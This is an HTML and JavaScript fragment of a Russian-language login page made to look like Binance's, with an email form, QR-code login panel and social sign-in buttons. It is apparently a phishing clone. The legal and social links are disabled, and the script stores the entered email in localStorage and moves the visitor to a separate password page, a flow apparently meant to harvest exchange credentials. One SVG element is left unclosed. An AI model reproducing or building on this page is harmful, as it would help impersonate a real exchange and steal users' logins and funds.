      <div class="auth-card__header">
        <h3 class="auth-card__title">Войти</h3>
        <button class="auth-card__qr-button">
          <svg size="32" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#EAECEF">
            <path fill-rule="evenodd" clip-rule="evenodd"
              d="M4 4h7v7H4V4zm0 9h7v7H4v-7zm11 0h-2v4h4v-2h3v-2h-4v2h-1v-2zm5 3h-2v2h-2v2h4v-4zm-5 2h-2v2h2v-2zM13 4h7v7h-7V4zM8.5 6.5h-2v2h2v-2zm-2 9h2v2h-2v-2zm11-9h-2v2h2v-2z"
              fill="#EAECEF"></path>
          </svg>
          <p class="auth-card__qr-tooltip-text">Вход по QR-коду</p>
          <div class="auth-card__qr-tooltip-text--arrow"></div>
        </button>
        <div class="auth-card__qr-main">
          <div class="auth-card__qr-main--arrow"></div>
          <div class="auth-card__qr-images">
            <img class="auth-card__qr-image" src="../../assets/img/qr.png" />
            <img class="auth-card__qr-scan-image" src="../../assets/img/qr-scan.svg" />
          </div>
          <p class="auth-card__qr-main-text">
            Отсканируйте этот код с помощью
            <a class="auth-link" href="/download">приложения Binance</a> для
            быстрого входа в систему.
          </p>
        </div>
      </div>
      <div class="auth-card__main">
        <form onsubmit="handleFormSubmit(event)">
          <label class="auth-card__input-box">
            Эл. почта/номер телефона
            <input class="auth-card__input" placeholder="Адрес эл. почты/номер телефона (без кода страны)" name="email"
              type="email" />
            <button class="auth-card__clear-button" type="button">
              <svg fill="#848e9c" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path fill-rule="evenodd" clip-rule="evenodd"
                  d="M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-7.233 0l3.006 3.005-1.768 1.768L12 13.767l-3.005 3.005-1.768-1.768 3.005-3.005-3.005-3.005 1.768-1.767L12 10.23l3.005-3.005 1.768 1.767L13.767 12z"
                  fill="#848e9c"></path>
              </svg>
            </button>
          </label>
          <span class="input-error"></span>
          <button class="auth-card__button">Далее</button>
        </form>
      </div>
      <div class="auth-card__socials">
        <div class="auth-card__socials-title">
          <span class="auth-card__socials-line"></span>
          <span>или</span>
          <span class="auth-card__socials-line"></span>
        </div>
        <a href="#" onclick="return false;" class="auth-card__social">
          <img class="auth-card__social-icon" src="../../assets/img/icons/google.png" alt="Google" />
          <span>Продолжить с Google</span>
        </a>
        <a href="#" onclick="return false;" class="auth-card__social">
          <img class="auth-card__social-icon" src="../../assets/img/icons/ios.png" alt="IOS" />
          <span>Продолжить с Apple</span>
        </a>
        <a href="#" onclick="return false;" class="auth-card__social">
          <svg class="auth-card__social-icon_teg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
            <path fill-rule="evenodd" clip-rule="evenodd"
              d="M2.81176 9.27221C7.28568 7.323 10.269 6.03796 11.7617 5.41709C16.0237 3.64439 16.9093 3.33645 17.4865 3.32628C17.6135 3.32404 17.8973 3.35551 18.0812 3.50471C18.2365 3.63069 18.2792 3.80087 18.2996 3.92032C18.3201 4.03976 18.3455 4.31186 18.3253 4.52447C18.0943 6.95117 17.095 12.8401 16.5865 15.5581C16.3714 16.7081 15.9478 17.0937 15.5377 17.1315C14.6465 17.2135 13.9698 16.5425 13.1066 15.9767C11.7559 15.0913 10.9928 14.5401 9.68167 13.6761C8.16646 12.6776 9.14871 12.1288 10.0122 11.2319C10.2382 10.9972 14.1649 7.42551 14.2409 7.10151C14.2505 7.06098 14.2593 6.90993 14.1695 6.83017C14.0798 6.75042 13.9474 6.77769 13.8518 6.79938C13.7163 6.83013 11.5585 8.25635 7.3784 11.078C6.76592 11.4986 6.21115 11.7035 5.7141 11.6928C5.16614 11.681 4.11208 11.383 3.3285 11.1283C2.3674 10.8159 1.60354 10.6507 1.67005 10.1201C1.7047 9.84375 2.08527 9.56112 2.81176 9.27221Z"

          <span>Продолжить с Telegram</span>
        </a>

      </div>
    </div>
    <a class="auth-link" href="/register">Создать аккаунт Binance</a>
  </div>
  <footer class="login-footer">
    <span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#EAECEF">
        <path fill-rule="evenodd" clip-rule="evenodd"
          d="M15.23 20.403a9.011 9.011 0 005.684-7.153h-3.942c-.147 2.86-.793 5.388-1.741 7.153zm-.757-7.153c-.178 4.102-1.217 7.25-2.473 7.25-1.256 0-2.295-3.148-2.473-7.25h4.946zm0-2.5H9.527C9.705 6.648 10.744 3.5 12 3.5c1.256 0 2.295 3.148 2.473 7.25zm2.499 0h3.942a9.01 9.01 0 00-5.683-7.153c.948 1.765 1.594 4.293 1.741 7.153zm-9.936 0c.147-2.862.793-5.392 1.743-7.156a9.01 9.01 0 00-5.693 7.156h3.95zm0 2.5h-3.95a9.01 9.01 0 005.693 7.157c-.95-1.765-1.596-4.295-1.743-7.157z"
          fill="#EAECEF"></path>
      </svg>
      Русский</span>
    <button>Cookies</button>
    <a href="#" onclick="return false;">Условия</a>
    <a href="#" onclick="return false;">Конфиденциальность</a>
  </footer>
  <script>
    const input = document.querySelector(".auth-card__input");
    const clearButton = document.querySelector(".auth-card__clear-button");
    const inputError = document.querySelector(".input-error");
    const sendButton = document.querySelector(".auth-card__button");

    function toggleClearButton() {
      if (input.value.length > 0) {
        clearButton.style.display = "block";
      } else {
        clearButton.style.display = "none";
      }

      inputError.textContent = "";
      input.classList.remove("error");
    }

    function handleFormSubmit(event) {
      event.preventDefault();

      const email = input.value;

      if (email && input.checkValidity()) {
        localStorage.setItem("login_email", email);

        window.location.href = "/ru/login-password";
      } else {
        inputError.textContent =
          "Введите действующий адрес эл. почты или номер телефона.При введении номера телефона не используйте пробелы или специальные символы.";
        input.classList.add("error");
      }
    }

    input.addEventListener("input", toggleClearButton);

    clearButton.addEventListener("click", () => {
      input.value = "";
      toggleClearButton();
    });

    const qrButton = document.querySelector(".auth-card__qr-button");
    const qrMain = document.querySelector(".auth-card__qr-main");

    qrButton.addEventListener("click", () => {
      qrMain.classList.toggle("show");

      document.querySelector(".auth-card__qr-tooltip-text").style.opacity =
        "0";
      document.querySelector(".auth-card__qr-tooltip-text").style.zIndex =
        "-1";
      document.querySelector(
        ".auth-card__qr-tooltip-text--arrow"
      ).style.opacity = "0";
      document.querySelector(
        ".auth-card__qr-tooltip-text--arrow"
      ).style.zIndex = "-1";
    });
  </script>
